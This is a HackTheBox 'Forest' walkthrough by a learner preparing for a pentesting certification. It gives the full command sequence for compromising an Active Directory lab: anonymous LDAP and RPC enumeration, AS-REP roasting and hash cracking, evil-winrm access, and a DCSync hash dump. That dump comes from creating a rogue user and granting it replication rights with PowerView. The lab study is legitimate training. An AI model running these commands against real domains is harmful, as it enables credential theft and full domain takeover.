Forest — HTB Writeup

Introduction:

Welcome back to my second Active Directory HTB lab in my little mini-series! This lab called Forest is another easy machine that focuses on using anonymous LDAP bind to enumerate users with kerberos pre authentication disabled and escalating privileges with a group with WriteDACL permissions over the domain that leads to a DCSync attack. I have a list of the best AD labs to do and I will definitely be getting to those soon. Active Directory will be my main focus in my studying for CPTS. Developing a deep understanding of AD is a crucial skill to have for any pen tester or anyone aspiring to be one like I am. Let’s get started with this one.

Enumeration:

The first thing I’ll always do is run an nmap scan.

nmap -sCV -A -p- -v <TARGET IP>

Now I’ll see what information I get on the domain.

There is a lot of information to digest in this. The most important things that I noticed is LDAP being open and DNS being open. I also got the name of the domain which is htb.local. I tried to enumerate further with DNS but no luck came out of that so I went to test if I could get any info using ldapsearch anonymously.

ldapsearch -H ldap://<TARGET IP> -x -b "dc=htb,dc=local"

I used this command to see if I could get a response that shows I can anonymously authenticate myself.

I won’t waste space showing the rest of the information, but I was able to get every object returned to me. Now I’ll change my command around to see what else I can learn.

ldapsearch -H ldap://<TARGET IP> -x -b "dc=htb,dc=local" "(objectClass=user)" sAMAccountName

I tried to find users that are As-REP roastable but ldapsearch wasn’t returning anything that helped me.

After struggling for about 20 minutes. I did learn that I was supposed to find a user with kerberos pre auth disabled. I decided to try another method to see if there is a user that is just not being returned to me. I tried using rpcclient to enumerate all the users in the domain and see if that returns any that ldapsearch missed.

rpcclient -U "" -N <TARGET IP> 
enumdomusers

I finally found another user named svc_alfresco that I think is worth my while.Now, I’ll use GetNPUsers from the Impacket suite after adding the user to a user.txt file and see if I can get the hash and crack if offline.

Gaining a Foothold:

impacket-GetNPUsers htb.local\ -usersfile users.txt -no-pass -dc-ip <TARGET IP> -request

I got the hash for the user and I’ll use hashcat to crack it and get the password. I also noticed that the ports I would need to use evil-winrm are open so I plan to get a session that way after I crack this hash.

hashcat -m 18200 alfresco_hash.txt /usr/share/wordlists/rockyou.txt

I’ve always preferred hashcat over john the ripper just because the syntax is simpler and looks cooler to use in my opinion. Obviously, there is multiple ways to do this part of the lab. The attack chain itself throughout this entire machine is very similar to Sauna, the last lab I did. If you haven’t looked at it yet, I suggest you do so you can see the similarities.

The hash was cracked pretty easily. The password given to us was s3rvice and now I can use evil-winrm to authenticate as the svc_alfresco user and get the first flag.

evil-winrm -i <TARGET IP> -u svc_alfresco -p s3rvice
cd ..
cd Desktop
dir
cat user.txt

Just like that, I got the user flag. Like I said earlier, this part was very similar to Sauna, so it was pretty smooth sailing to get to this point. Now it is time for me to escalate my privileges to get the root flag in the Administrator Desktop.

Privilege Escalation:

Now that I have got my session as an authenticated user within the domain. I have to find a way to elevate myself. AD is a very vast and complex system that can be a brute to find paths manually. That’s where BloodHound comes in. I’ll upload the SharpHound.exe tool to my evil-winrm session and execute it to get the zip file that I can then download to my host machine and examine there.

.\SharpHound.exe -c All
ls

Now that I have the zip file, I can launch BloodHound with the zip file to get data on the domain and find the shortest path to try and get admin privileges or even NT AUTHORITY/SYSTEM.

I launch the GUI and use the query Shortest Paths to High Value Targets after stating that I own the svc_alfresco user. What I find is that the Exchange Windows Permissions group has WriteDACL permissions over the whole domain. This tells me that a user within that group can be used to elevate my privileges through a DCSync attack. I also notice that there is a group that allows users a part of that group to add themselves to the Exchange Windows Permissions group; that group is Account Operators and the user I own is a part of that group. Again, there are many ways to gain the privileges you need to get the root flag. My tool of choice here will be PowerView. So I’ll upload it to my evil-winrm session and go from there. My attack flow will be creating a new user and adding them to the Exchange Windows Permissions group, then I will use PowerView to give that user DS-Replication-Get-Changes-All extended rights to dump the administrator hash.

net user hacker pwned1234 /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" hacker /add /domain

After creating and adding the new user, this is where PowerView comes in.

$SecPassword = ConvertTo-SecureString 'pwned1234' -AsPlainText -Force

This command takes the plaintext password and encrypts it in the memory using the Windows Data Protection API, storing it as a System.Security.SecureString object in the $SecPassword variable.

$Cred = New-Object System.Management.Automation.PSCredential('htb/hacker', $SecPassword)

This command creates a PSCredential object that stores the username and the $SecPassword variable created before this together.

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "htb/hacker" -Rights DCSync

The final command modifies the ACL to allow the newly created user to perform a DCSync attack. It gives the user specific replication rights that can allow users to use mimikatz, secretsdump.py, etc. to dump hashes for any user in the domain. I’ll double check that everything was completed successfully first.

Get-DomainUser hacker | Select-Object samaccountname, objectsid

My new user was created perfectly, now I’ll check the rights just to make sure.

Get-DomainObjectAcl "DC=htb,DC=local" -Resolve GUIDs | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-3072663084-364016917-1341370565-10102"}

This command dumps a lot of info, so I’ll only show what I was looking for.

I find that the new user does have DS-Replication-Get-Changes-All so I now know that I can attack and dump the hashes from my host machine. I’ll use secretsdump.py like I previously mentioned earlier to accomplish this.

secretsdump.py htb.local/hacker:pwned1234@<TARGET IP>

As you can see, using the new user I created and successfully utilizing a DCSync attack allowed me to obtain the Administrator hash. I should be able to go back to evil-winrm and establish a elevated session using that hash to get the last flag.

evil-winrm -i <TARGET IP> -u Administrator -H <Hash>
cd ..
cd Desktop
ls
cat root.txt

I got the root flag! I was able to authenticate with the admin hash that was dumped and pwn this machine. Another very fun AD lab in the books and every lab I do gets me even more excited for the next one.
